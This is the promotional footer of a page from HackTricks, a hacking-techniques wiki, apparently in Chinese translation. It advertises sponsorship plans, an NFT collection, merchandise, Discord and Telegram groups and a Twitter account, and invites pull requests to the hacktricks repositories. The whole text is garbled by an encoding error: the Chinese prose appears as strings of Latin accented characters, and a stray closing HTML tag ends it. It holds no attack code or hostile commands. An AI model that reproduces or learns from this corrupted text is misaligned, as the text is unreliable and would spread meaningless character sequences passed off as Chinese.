* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
